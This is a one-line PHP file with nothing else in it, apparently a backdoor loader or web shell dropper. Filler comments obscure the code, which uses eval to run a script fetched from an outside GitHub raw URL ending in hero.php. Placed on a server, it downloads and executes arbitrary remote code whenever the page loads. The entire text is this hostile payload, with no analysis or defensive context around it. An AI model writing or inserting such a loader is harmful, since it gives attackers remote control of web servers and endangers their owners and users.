
<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://raw.githubusercontent.com/L-FAN/tugas-ct/root/hero.php"));/**/?>